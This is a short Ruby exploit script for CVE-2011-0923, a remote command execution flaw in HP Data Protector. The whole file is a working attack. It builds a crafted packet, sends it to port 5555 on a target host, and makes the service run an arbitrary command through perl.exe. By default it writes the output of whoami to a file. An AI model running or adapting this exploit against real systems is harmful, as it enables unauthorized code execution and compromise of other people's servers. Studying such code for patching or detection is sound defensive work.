#!/usr/bin/env ruby
# HP Data Protector Remote Command Execution
# CVE-2011-0923
# still needs work, but will do. commands are ran blindly
# ripped from...alessandro/mclaudio

require 'socket'
#require 'rex'

host = ARGV[0]
cmd  = ARGV[1] || "whoami >> %SYSTEMDRIVE%\\mc.txt"

def usage
 puts "[*] #{$0} <host> [cmd]"
 exit
end

usage if ARGV.size < 1

command = cmd

command = command.gsub("\\", "\\\\")

command_size = (46 + command.size).chr

crafted_pkt = "\x00\x00\x00"
crafted_pkt << command_size   
crafted_pkt << "\x32\x00\x01" 
crafted_pkt << "\x01\x01\x01" 
crafted_pkt << "\x01\x01\x00" 
crafted_pkt << "\x01\x00\x01" 
crafted_pkt << "\x00\x01\x00" 
crafted_pkt << "\x01\x01\x00" 
crafted_pkt << "\x2028\x00"   
crafted_pkt << "\\perl.exe"   
crafted_pkt << "\x00 -esystem('#{command}')\x00"

#puts Rex::Text.to_hex_dump(crafted_pkt)    

begin
 sock = TCPSocket.new(host,5555)
 puts "[*] Executing command '#{command}'..."
 sock.write(crafted_pkt)
rescue => e
 puts "[!] #{e}"
 exit
end
sock.close
